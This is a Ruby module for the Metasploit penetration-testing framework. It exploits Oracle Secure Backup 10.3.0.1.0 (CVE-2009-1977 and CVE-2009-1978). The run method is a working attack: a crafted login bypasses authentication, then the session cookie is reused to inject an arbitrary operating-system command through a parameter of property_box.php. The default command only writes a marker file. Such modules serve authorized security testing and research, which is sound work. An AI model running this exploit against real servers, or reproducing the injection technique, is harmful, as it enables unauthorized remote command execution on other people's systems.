##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Oracle Secure Backup Authentication Bypass/Command Injection Vulnerability',
      'Description'    => %q{
          This module exploits an authentication bypass vulnerability
          in login.php in order to execute arbitrary code via a command injection
          vulnerability in property_box.php. This module was tested
          against Oracle Secure Backup version 10.3.0.1.0 (Win32).
      },
      'Author'         => [ 'MC' ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'CVE', '2009-1977' ],
          [ 'OSVDB', '55903' ],
          [ 'CVE', '2009-1978' ],
          [ 'OSVDB', '55904' ],
          [ 'ZDI', '09-058' ],
          [ 'ZDI', '09-059' ],
        ],
      'DisclosureDate' => 'Aug 18 2009'))

    register_options(
      [
        Opt::RPORT(443),
        OptString.new('CMD', [ false, "The command to execute.", "cmd.exe /c echo metasploit > %SYSTEMDRIVE%\\metasploit.txt" ]),
        OptBool.new('SSL',   [true, 'Use SSL', true]),
      ])
  end

  def run
    cmd = datastore['CMD']

    res = send_request_cgi(
      {
        'uri'	=>  '/login.php',
        'data'	=>  'button=Login&attempt=1&mode=&tab=75&uname=-msf&passwd=msf',
        'method' => 'POST',
      }, 5)

      if res && res.get_cookies.match(/PHPSESSID=(.*);(.*)/i)

          print_status("Sending command: #{datastore['CMD']}...")

          send_request_cgi(
            {
              'uri'	=> '/property_box.php',
              'data'  => 'type=Sections&vollist=75' + Rex::Text.uri_encode("&" + cmd),
              'cookie' => res.get_cookies,
              'method' => 'POST',
            }, 5)

          print_status("Done.")
      else
        print_error("Invalid PHPSESSION token..")
        return
      end
  end
end
